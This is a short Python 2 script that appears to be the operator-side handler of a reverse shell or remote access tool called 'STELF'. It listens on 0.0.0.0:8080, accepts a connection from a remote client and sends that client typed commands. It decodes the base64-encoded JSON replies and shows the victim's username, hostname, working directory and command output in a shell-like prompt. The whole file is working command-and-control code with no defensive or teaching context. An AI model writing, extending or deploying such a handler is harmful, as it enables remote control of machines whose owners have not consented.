#!/usr/bin/env python2
import socket, sys, json, base64

class Handler:
	def __init__(self, bind, port):
		self.bind = bind
		self.port = port
                
		self.cwd = "STELF CONNECTED"
		self.prompt = self.cwd + ">> "
		self.server_sock = socket.socket()
		self.server_sock.bind((self.bind, self.port))
		
		self.commands = []
		
	def send_cmd(self, command):
		self.commands.append(command)
		self.client_socket.sendall(command)
		
	def make_prompt(self, data_package):
		if data_package["username"] and data_package["hostname"]:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + "@" +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">> "

		else:
			self.prompt = data_package["localtime"] + " " +\
							data_package["username"] + " " +\
							data_package["hostname"] + " " +\
							data_package["cwd"] + ">> "
							
		self.prompt = self.prompt.strip()

	def start(self):
		self.server_sock.listen(5)
		self.client_socket, _ = self.server_sock.accept()
		while True:
			user_input = raw_input("\n" + self.prompt)
			if user_input == "help":
				print "Available commands:\n prompt - change prompt"
			self.send_cmd(user_input)
			data = self.client_socket.recv(4096)
			data_package = json.loads(data)
			for key in data_package:
				data_package[key] = base64.b64decode(data_package[key])
			
			self.make_prompt(data_package)
			
			sys.stdout.write(data_package["data"])

handler = Handler("0.0.0.0", 8080)
handler.start()
